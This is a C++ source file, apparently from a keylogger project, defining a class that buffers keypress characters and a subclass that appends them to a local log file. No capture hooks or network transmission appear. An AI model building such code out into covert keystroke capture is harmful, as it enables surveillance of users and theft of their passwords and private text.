#include "recorder/recorder.h"

#include <fstream>
#include <stdexcept>

namespace keylogger {

Recorder::Recorder(int key_limit) : num_keys_(0), keys_(key_limit) {
  if (key_limit <= 0) {
    throw std::invalid_argument("key_limit must be a positive integer");
  }
}

void Recorder::BufferKeyPress(char character) {
  if (num_keys_ >= static_cast<int>(keys_.capacity())) {
    /* no room remaining to log this key, flush the buffer */
    Transmit();
  }
  keys_[num_keys_++] = character;
}

FileRecorder::FileRecorder(int key_limit, const std::filesystem::path& log_path)
    : Recorder(key_limit), log_path_(log_path) {}

void FileRecorder::Transmit() {
  if (!num_keys_) {
    return;
  }

  std::ofstream log_handle(log_path_.c_str(), std::ios_base::app);
  if (!log_handle) {
    throw std::runtime_error("unable to open key log file");
  }
  log_handle.write(keys_.data(), num_keys_);
  num_keys_ = 0;
}

}  // namespace keylogger
